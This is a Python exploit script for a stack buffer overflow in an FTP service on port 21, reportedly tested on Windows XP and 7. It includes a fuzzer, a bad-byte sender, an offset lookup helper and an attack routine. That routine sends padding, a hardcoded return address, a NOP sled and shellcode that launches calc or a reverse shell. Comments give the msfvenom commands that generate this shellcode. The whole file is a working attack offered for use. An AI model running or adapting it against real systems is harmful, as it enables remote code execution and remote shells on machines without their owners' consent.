#!/usr/bin/env python3
import socket, sys, time, binascii, struct
from pwn import cyclic, cyclic_find, unhex
from etc import payloads
"""

NOTE: i do not take credit for discovering this bug (obviously)
Tested on: windows xp, windows 7
Author: Manjoos
note: 
i may attempt to write a version that bypasses windows 10 stack protections
when i have the suffiecient hardware to run a windows 10 vm that is

"""
# change me plz
host = "192.168.1.144"
port = 21

calc = True

p32 = lambda x: struct.pack("I", x)
offset = 250
# 0x77def049
ret = p32(0x77def049)

if calc:
    buf = payloads.setbufcalc()
else:
    buf = payloads.setbufshell()

# msfvenom -p windows/exec CMD=calc -f py -b "\x00\x0a\x0d"
# msfvenom -p windows/shell/reverse_tcp -b "\x00\x0a\x0d" -f py lhost=127.0.0.1 lport=4444
# bad bytes: \x00\x0a\x0d

nop = b"\x90" * 30
payload = b"A"*251 + ret + nop + buf

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        print("Sending Payload!")
        s.send(payload + b"\r\n")
    except:
        print("Yeh done goofed, i cant connect yeh pesky bastard!")

def lookup(value):
    # the eip will be in little endianess, so least significant byte first
    # this means that pwntools will not manually unhex/change endianess for you
    # cyclic_find will only search for ascii values, anything other than that it will complain
    print(cyclic_find(unhex(value)[::-1]))

def fuzz():
    print("Fuzzing!")
    buffer = []
    counter = 100
    while len(buffer) < 30:
        buffer.append("A"*counter)
        counter += 100

    for string in buffer:
        try:
            p = cyclic(len(string))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.recv(1024)
            print("Sending %s Bytes!" % len(p))
            print("Payload: \n%s" % p)
            s.send(p + b"\r\n")
            s.recv(1024)
            s.close()
            time.sleep(0.5)
        except socket.error:
            print("Could not connect to: %s:%s" % (host, port))
            sys.exit(0)
def badsend():
	bad = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\
	\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\
	\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\
	\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\
	\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\
	\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\
	\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\
	\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\
	\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\
	\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\
	\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\
	\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\
	\xfb\xfc\xfd\xfe\xff"
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.send(bad)
	s.close()
try:
    if len(sys.argv) > 1 and sys.argv[1] == "-b":
        print("Sending bad bytes!!!")
        badsend()
    elif sys.argv[1] == "-f":
        fuzz()
    elif sys.argv[1] == "-a":
        main()
    elif sys.argv[1] == "-l":
        lookup(sys.argv[2])
except IndexError:
    print("Usage: python %s [-f] [-b] [-a] [-l]" % sys.argv[0])
    print("-f\tFuzz the target!\n-b\tThrow a shit ton of bad bytes!!\n-a\tBombz Away!..")
    print("-l\tLookup offset of overwritten return address (Example: -l 61616E63)")
